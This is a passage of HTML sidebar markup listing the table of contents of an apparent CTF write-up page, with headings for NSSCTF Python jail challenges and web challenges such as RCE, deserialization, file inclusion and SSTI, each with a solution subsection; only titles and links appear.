jail level 1</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-8"><span class="toc-nav-number">1.8.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-2"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">NSSCTF jail level 2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-9"><span class="toc-nav-number">1.9.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-2-5"><span class="toc-nav-number">1.10.</span> <span class="toc-nav-text">NSSCTF jail level 2.5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-10"><span class="toc-nav-number">1.10.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-3"><span class="toc-nav-number">1.11.</span> <span class="toc-nav-text">NSSCTF jail level 3</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-11"><span class="toc-nav-number">1.11.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4"><span class="toc-nav-number">1.12.</span> <span class="toc-nav-text">NSSCTF jail level 4</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-12"><span class="toc-nav-number">1.12.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level4-0-5"><span class="toc-nav-number">1.13.</span> <span class="toc-nav-text">NSSCTF jail level4.0.5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-13"><span class="toc-nav-number">1.13.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4-1"><span class="toc-nav-number">1.14.</span> <span class="toc-nav-text">NSSCTF jail level 4.1</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-14"><span class="toc-nav-number">1.14.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4-2"><span class="toc-nav-number">1.15.</span> <span class="toc-nav-text">NSSCTF jail level 4.2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-15"><span class="toc-nav-number">1.15.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4-3"><span class="toc-nav-number">1.16.</span> <span class="toc-nav-text">NSSCTF jail level 4.3</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-16"><span class="toc-nav-number">1.16.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-5"><span class="toc-nav-number">1.17.</span> <span class="toc-nav-text">NSSCTF jail level 5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-17"><span class="toc-nav-number">1.17.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-6"><span class="toc-nav-number">1.18.</span> <span class="toc-nav-text">NSSCTF jail level 6</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-18"><span class="toc-nav-number">1.18.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-7"><span class="toc-nav-number">1.19.</span> <span class="toc-nav-text">NSSCTF jail level 7</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-19"><span class="toc-nav-number">1.19.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-s-Fe-safeeval"><span class="toc-nav-number">1.20.</span> <span class="toc-nav-text">NSSCTF s@Fe safeeval</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-20"><span class="toc-nav-number">1.20.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-python2-jail"><span class="toc-nav-number">1.21.</span> <span class="toc-nav-text">NSSCTF python2 jail</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-21"><span class="toc-nav-number">1.21.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-lake-lake-lake"><span class="toc-nav-number">1.22.</span> <span class="toc-nav-text">NSSCTF jail lake lake lake</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-22"><span class="toc-nav-number">1.22.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-l-ke-l-ke-l-ke"><span class="toc-nav-number">1.23.</span> <span class="toc-nav-text">## NSSCTF jail l@ke l@ke l@ke</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-23"><span class="toc-nav-number">1.23.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-laKe-laKe-laKe"><span class="toc-nav-number">1.24.</span> <span class="toc-nav-text">NSSCTF laKe laKe laKe</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-24"><span class="toc-nav-number">1.24.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-Side-channel-pyjail-tyPe-Ch-nnEl"><span class="toc-nav-number">1.25.</span> <span class="toc-nav-text">NSSCTF Side-channel&#x2F;pyjail: tyPe Ch@nnEl</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-25"><span class="toc-nav-number">1.25.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">WEB</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Challenge-RCE"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">Challenge RCE</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-26"><span class="toc-nav-number">2.1.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#easy-unser"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">easy_unser</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-27"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#easy-include"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">easy_include</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-28"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CanYouRCE"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">CanYouRCE</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-29"><span class="toc-nav-number">2.4.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ez-phar"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">ez_phar</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-30"><span class="toc-nav-number">2.5.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#logjjjjlogjjjj"><span class="toc-nav-number">2.6.</span> <span class="toc-nav-text">logjjjjlogjjjj</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-31"><span class="toc-nav-number">2.6.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SSTI"><span class="toc-nav-number">2.7.</span> <span class="toc-nav-text">SSTI</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-32"><span class="toc-nav-number">2.7.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ohmywordpress"><span class="toc-nav-number">2.8.</span> <span class="toc-nav-text">ohmywordpress</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-33"><span class="toc-nav-number">2.8.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#QAQ-1inclu4e"><span class="toc-nav-number">2.9.</span> <span class="toc-nav-text">QAQ_1inclu4e</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-34"><span class="toc-nav-number">2.9.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Fun-php"><span class="toc-nav-number">2.10.</span> <span class="toc-nav-text">Fun_php</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-35"><span class="toc-nav-number">2.10.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#unf1ni3hed-web3he11"><span class="toc-nav-number">2.11.</span> <span class="toc-nav-text">unf1ni3hed_web3he11</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-36"><span class="toc-nav-number">2.11.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#fun-sql"><span class="toc-nav-number">2.12.</span> <span class="toc-nav-text">fun_sql</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">3.</span> <span class="toc-nav-text"></span></a></li></ol>
         
         </div>
       </aside>
